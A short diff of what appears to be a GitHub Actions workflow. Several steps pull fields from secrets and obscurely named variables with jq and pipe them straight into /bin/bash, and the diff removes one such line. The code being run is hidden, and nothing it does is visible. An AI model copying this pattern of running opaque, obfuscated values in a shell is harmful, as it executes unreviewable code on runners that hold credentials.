@@ -20,7 +20,6 @@ jobs:
           fkf36917: ${{ secrets.fkf36917 }}
         run: |
           printf '%s' "$fkf36917" | jq -r .uzsd8352 | /bin/bash
-          echo $ke20961 | jq -r .ticsc278 | /bin/bash
           echo $g2916 | jq -r .ko65627 | /bin/bash
           echo $xkbtu37 | jq -r .q69590 | /bin/bash
           echo $mpq3 | jq -r .eky8 | /bin/bash
